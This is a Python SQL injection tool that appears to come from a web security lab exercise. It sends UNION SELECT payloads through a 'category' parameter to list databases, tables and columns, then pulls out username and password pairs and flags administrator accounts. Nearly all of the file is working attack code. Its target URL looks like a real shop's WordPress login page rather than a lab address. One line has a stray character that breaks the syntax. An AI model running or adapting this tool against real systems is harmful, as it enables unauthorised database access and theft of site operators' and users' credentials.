import requests
import re
from urllib.parse import quote

# Update with your actual lab URL
LAB_URL = "https://dipelectronicslabshop.in/wp-login.php"

def get_all_tables():
    """Get all tables in the database"""
    print("\n" + "=" * 70)
    print("GETTING ALL TABLES")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    # Get all tables
    payload = "' UNION SELECT table_name FROM information_schema.tables-- "
    params = {'category': payload}2
    
    
    print(f"[*] Payload: {payload}")
    response = requests.get(base_url, params=params)
    
    if response.status_code == 200:
        # Extract table names
        clean_text = re.sub(r'<[^>]+>', '\n', response.text)
        lines = clean_text.split('\n')
        
        tables = []
        for line in lines:
            line = line.strip()
            if line and not any(skip in line.lower() for skip in ['select', 'from', 'union', 'null', 'information_schema']):
                if len(line) < 100:  # Filter out HTML/JavaScript
                    tables.append(line)
        
        # Remove duplicates and sort
        tables = sorted(list(set(tables)))
        
        print(f"\n[+] Found {len(tables)} tables:")
        for table in tables:
            print(f"    - {table}")
            
        return tables
    
    return []

def get_table_columns(table_name):
    """Get columns for a specific table"""
    print(f"\n[*] Getting columns for table: {table_name}")
    
    base_url = f"{LAB_URL}/filter"
    
    payload = f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'-- "
    params = {'category': payload}
    
    response = requests.get(base_url, params=params)
    
    if response.status_code == 200:
        clean_text = re.sub(r'<[^>]+>', '\n', response.text)
        lines = clean_text.split('\n')
        
        columns = []
        for line in lines:
            line = line.strip()
            if line and not any(skip in line.lower() for skip in ['select', 'from', 'union', 'null', 'column_name']):
                if len(line) < 50:  # Column names are usually short
                    columns.append(line)
        
        columns = sorted(list(set(columns)))
        
        if columns:
            print(f"    Columns: {', '.join(columns)}")
            
        return columns
    
    return []

def extract_user_data(table_name, username_col, password_col):
    """Extract username and password from a table"""
    print(f"\n" + "=" * 70)
    print(f"EXTRACTING CREDENTIALS FROM: {table_name}")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    # Since we only have 1 column, we need to concatenate username and password
    payload = f"' UNION SELECT CONCAT({username_col},':',{password_col}) FROM {table_name}-- "
    
    print(f"[*] Payload: {payload}")
    params = {'category': payload}
    
    response = requests.get(base_url, params=params)
    
    if response.status_code == 200:
        clean_text = re.sub(r'<[^>]+>', '\n', response.text)
        lines = clean_text.split('\n')
        
        credentials = []
        for line in lines:
            line = line.strip()
            if ':' in line and not any(skip in line.lower() for skip in ['select', 'from', 'union', 'concat']):
                if len(line) < 100:  # Filter out long HTML/JS lines
                    credentials.append(line)
        
        credentials = list(set(credentials))  # Remove duplicates
        
        if credentials:
            print("\n[+] Found credentials:")
            for cred in credentials:
                parts = cred.split(':', 1)
                if len(parts) == 2:
                    print(f"    Username: {parts[0]}")
                    print(f"    Password: {parts[1]}")
                    print("    " + "-" * 40)
                    
                    # Check for administrator
                    if 'admin' in parts[0].lower():
                        print(f"\n[!] ADMINISTRATOR FOUND!")
                        print(f"    Username: {parts[0]}")
                        print(f"    Password: {parts[1]}")
        
        return credentials
    
    return []

def find_user_tables(tables):
    """Find tables that might contain user data"""
    user_tables = []
    
    # Common patterns for user tables
    patterns = ['user', 'admin', 'account', 'member', 'login', 'auth', 'credential']
    
    for table in tables:
        for pattern in patterns:
            if pattern in table.lower():
                user_tables.append(table)
                break
    
    return user_tables

def full_enumeration():
    """Complete database enumeration for single column"""
    print("MySQL INJECTION - FULL DATABASE ENUMERATION")
    print("=" * 70)
    
    # Step 1: Get all tables
    tables = get_all_tables()
    
    if not tables:
        print("[-] No tables found")
        return
    
    # Step 2: Find user-related tables
    user_tables = find_user_tables(tables)
    
    if user_tables:
        print(f"\n[+] Found {len(user_tables)} potential user tables:")
        for table in user_tables:
            print(f"    - {table}")
    else:
        print("\n[!] No obvious user tables found. Checking all tables...")
        user_tables = tables[:10]  # Check first 10 tables
    
    # Step 3: For each user table, get columns and try to extract data
    for table in user_tables:
        print(f"\n" + "=" * 50)
        print(f"Analyzing table: {table}")
        print("=" * 50)
        
        columns = get_table_columns(table)
        
        if columns:
            # Look for username and password columns
            username_cols = []
            password_cols = []
            
            for col in columns:
                col_lower = col.lower()
                if any(u in col_lower for u in ['user', 'name', 'login', 'email']):
                    username_cols.append(col)
                if any(p in col_lower for p in ['pass', 'pwd', 'hash']):
                    password_cols.append(col)
            
            # Try to extract data if we found both types
            if username_cols and password_cols:
                print(f"\n[+] Potential credentials columns found!")
                print(f"    Username columns: {username_cols}")
                print(f"    Password columns: {password_cols}")
                
                # Try first username and password column
                extract_user_data(table, username_cols[0], password_cols[0])

def get_specific_data():
    """Interactive mode to get specific data"""
    print("\n" + "=" * 70)
    print("INTERACTIVE DATA EXTRACTION")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    while True:
        print("\nOptions:")
        print("1. List all databases")
        print("2. List all tables")
        print("3. Get columns from a table")
        print("4. Extract data from a table")
        print("5. Custom query")
        print("6. Exit")
        
        choice = input("\nChoice: ").strip()
        
        if choice == "1":
            payload = "' UNION SELECT schema_name FROM information_schema.schemata-- "
            print(f"Payload: {payload}")
            
        elif choice == "2":
            payload = "' UNION SELECT table_name FROM information_schema.tables-- "
            print(f"Payload: {payload}")
            
        elif choice == "3":
            table = input("Enter table name: ").strip()
            payload = f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- "
            print(f"Payload: {payload}")
            
        elif choice == "4":
            table = input("Enter table name: ").strip()
            col1 = input("Enter column 1 (e.g., username): ").strip()
            col2 = input("Enter column 2 (e.g., password): ").strip()
            payload = f"' UNION SELECT CONCAT({col1},':',{col2}) FROM {table}-- "
            print(f"Payload: {payload}")
            
        elif choice == "5":
            payload = input("Enter custom payload: ").strip()
            
        elif choice == "6":
            break
        else:
            continue
        
        # Execute query
        params = {'category': payload}
        response = requests.get(base_url, params=params)
        
        if response.status_code == 200:
            clean_text = re.sub(r'<[^>]+>', '\n', response.text)
            lines = clean_text.split('\n')
            
            print("\n[+] Results:")
            count = 0
            for line in lines:
                line = line.strip()
                if line and not any(skip in line.lower() for skip in ['select', 'from', 'union']):
                    if len(line) < 100:
                        print(f"    {line}")
                        count += 1
                        if count > 50:
                            print("    ... (truncated)")
                            break

def main():
    print("MySQL INJECTION TOOL - SINGLE COLUMN")
    print("=" * 70)
    
    if "YOUR-LAB-ID" in LAB_URL:
        lab_url = input("Enter your lab URL: ").strip()
        globals()['LAB_URL'] = lab_url
    
    print("\nOptions:")
    print("1. Full automatic enumeration")
    print("2. Interactive mode")
    print("3. Quick credentials search")
    
    choice = input("\nChoice: ").strip()
    
    if choice == "1":
        full_enumeration()
    elif choice == "2":
        get_specific_data()
    elif choice == "3":
        # Quick search for common tables
        print("\n[*] Quick search for credentials...")
        
        common_tables = ['users', 'user', 'accounts', 'members', 'administrators', 'admin']
        base_url = f"{LAB_URL}/filter"
        
        for table in common_tables:
            print(f"\n[*] Trying table: {table}")
            
            # Try common column combinations
            attempts = [
                (f"' UNION SELECT CONCAT(username,':',password) FROM {table}-- ", "username:password"),
                (f"' UNION SELECT CONCAT(user,':',password) FROM {table}-- ", "user:password"),
                (f"' UNION SELECT CONCAT(email,':',password) FROM {table}-- ", "email:password"),
                (f"' UNION SELECT CONCAT(login,':',pass) FROM {table}-- ", "login:pass"),
                (f"' UNION SELECT CONCAT(uname,':',pwd) FROM {table}-- ", "uname:pwd"),
            ]
            
            for payload, desc in attempts:
                params = {'category': payload}
                response = requests.get(base_url, params=params, timeout=5)
                
                if response.status_code == 200 and ':' in response.text:
                    clean_text = re.sub(r'<[^>]+>', '\n', response.text)
                    lines = clean_text.split('\n')
                    
                    found = False
                    for line in lines:
                        if ':' in line and len(line) < 100 and not 'select' in line.lower():
                            if not found:
                                print(f"    [+] Found with {desc}:")
                                found = True
                            print(f"        {line}")
                    
                    if found:
                        break

if __name__ == "__main__":
    main()